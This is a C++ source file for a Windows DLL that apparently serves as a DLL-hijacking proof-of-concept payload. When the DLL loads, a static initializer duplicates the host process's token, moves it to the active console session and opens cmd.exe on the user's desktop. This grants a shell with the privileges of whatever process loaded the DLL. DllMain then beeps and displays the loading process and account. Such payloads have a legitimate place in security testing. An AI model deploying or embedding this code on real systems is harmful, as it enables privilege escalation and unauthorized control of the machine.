// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <filesystem>   
#include <wtsapi32.h>
#include <Lmcons.h>
#include <iostream>
#include <string>
#include <Windows.h>
#include <wtsapi32.h>

#pragma comment(lib, "Wtsapi32.lib")

using namespace std;

wstring expandPath(const wchar_t* input) {
    wchar_t szEnvPath[MAX_PATH];
    ::ExpandEnvironmentStringsW(input, szEnvPath, MAX_PATH);
    return szEnvPath;
}

auto getUsername() {
    wchar_t usernamebuf[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)usernamebuf, &size);
    static auto username = wstring{ usernamebuf };
    return username;
}

auto getProcessFilename() {
    wchar_t process_filenamebuf[MAX_PATH]{ 0x0000 };
    GetModuleFileName(0, process_filenamebuf, MAX_PATH);
    static auto process_filename = wstring{ process_filenamebuf };
    return process_filename;
}

auto getModuleFilename(HMODULE hModule = nullptr) {
    wchar_t module_filenamebuf[MAX_PATH]{ 0x0000 };
    if (hModule != nullptr) GetModuleFileName(hModule, module_filenamebuf, MAX_PATH);
    static auto module_filename = wstring{ module_filenamebuf };
    return module_filename;
}

bool showMessage() {
    Beep(4000, 400);
    Beep(4000, 400);
    Beep(4000, 400);

    auto m = L"This file:\n"s + getModuleFilename() + L"\nwas loaded by:\n"s + getProcessFilename() + L"\nrunning as:\n" + getUsername();
    auto message = (wchar_t*)m.c_str();
    DWORD messageAnswer{};
    WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, WTSGetActiveConsoleSessionId(), (wchar_t*)L"", 0, message, lstrlenW(message) * 2, 0, 0, &messageAnswer, true);

    return true;
}
bool spawnShell()
{
    STARTUPINFO startInfo = { 0x00 };
    startInfo.cb = sizeof(startInfo);
    startInfo.wShowWindow = SW_SHOW;
    startInfo.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

    PROCESS_INFORMATION procInfo = { 0x00 };

    HANDLE hToken = {};
    DWORD  sessionId = WTSGetActiveConsoleSessionId();

    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, &hToken);

    SetTokenInformation(hToken, TokenSessionId, &sessionId, sizeof(sessionId));

    if (CreateProcessAsUser(hToken,
        expandPath(L"%WINDIR%\\system32\\cmd.exe").c_str(),
        const_cast<wchar_t*>(L""),
        nullptr,
        nullptr,
        FALSE,
        NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE,
        nullptr,
        nullptr,
        &startInfo,
        &procInfo
    )
        ) {
        CloseHandle(procInfo.hProcess);
        CloseHandle(procInfo.hThread);
    }

    return true;
}
static const auto init = spawnShell();

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    getModuleFilename(hModule);
    static auto const msgshown = showMessage();
}